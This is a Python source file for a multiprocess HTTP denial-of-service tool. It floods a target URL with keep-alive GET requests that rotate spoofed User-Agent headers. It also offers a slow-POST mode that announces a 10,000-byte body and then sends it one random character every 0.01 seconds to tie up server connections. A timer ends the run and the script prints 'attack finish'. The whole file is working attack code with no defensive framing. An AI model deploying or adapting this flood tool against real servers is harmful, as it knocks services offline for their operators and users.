from multiprocessing import Process, Value, current_process
import string
import socket
import random
import time
import os

from common import url_parser
from common import UserAgentList, AcceptList


def tick_count(n: int, v: Value) -> None:
    time.sleep(n)

    if v.get_lock():
        v.value = 1


def send_get_requests(i: int, ip: str, port: int, path: str, v: Value) -> None:
    print(f'[{i + 1}] {current_process().name} {os.getpid()}')
    while v.value != 1:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip, port))

            request = 'GET ' + path + ' HTTP/1.1\r\n'
            request += 'HOST: ' + ip + '\r\n'
            request += 'Connection: keep-alive\r\n'
            request += 'Cache-Control: no-cache\r\n'
            request += 'User-Agent: ' + random.choice(UserAgentList.USER_AGENT_LIST) + '\r\n'
            request += 'Accept: ' + AcceptList.ACCEPT_LIST[0] + '\r\n'
            request += 'Accept-Encoding: gzip, deflate\r\n'
            request += 'Accept-Language: ko,en;q=0.9,en-US;q=0.8\r\n'
            request += '\r\n'

            sock.send(str.encode(request))


def send_post_requests(i: int, ip: str, port: int, path: str, v: Value) -> None:
    print(f'[{i + 1}] {current_process().name} {os.getpid()}')
    while v.value != 1:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip, port))

            request = 'POST ' + path + ' HTTP/1.1\r\n'
            request += 'HOST: ' + ip + '\r\n'
            request += 'Connection: keep-alive\r\n'
            request += 'Cache-Control: no-cache\r\n'
            request += 'Content-Length: 10000\r\n'
            request += 'User-Agent: ' + random.choice(UserAgentList.USER_AGENT_LIST) + '\r\n'
            request += '\r\n'

            sock.send(str.encode(request))

            for i in range(10000):
                payload = random.choice(string.ascii_letters + string.digits)
                sock.send(payload.encode('utf-8'))
                time.sleep(0.01)


def run(url: str, method: str, p_count: int, n: int):
    ip, port, path = url_parser(url)
    print(ip, port, path)

    share_value = Value('i', 0)

    tick_process = Process(target=tick_count, args=(n, share_value, ))
    tick_process.start()

    processes = list()
    for i in range(p_count):
        if method == 'get':
            p = Process(target=send_get_requests, args=(i, ip, port, path, share_value, ))
        elif method == 'post':
            p = Process(target=send_post_requests, args=(i, ip, port, path, share_value, ))

        processes.append(p)
        p.start()

    for process in processes:
        process.join()

    print(f'{ip}:{port} attack finish')
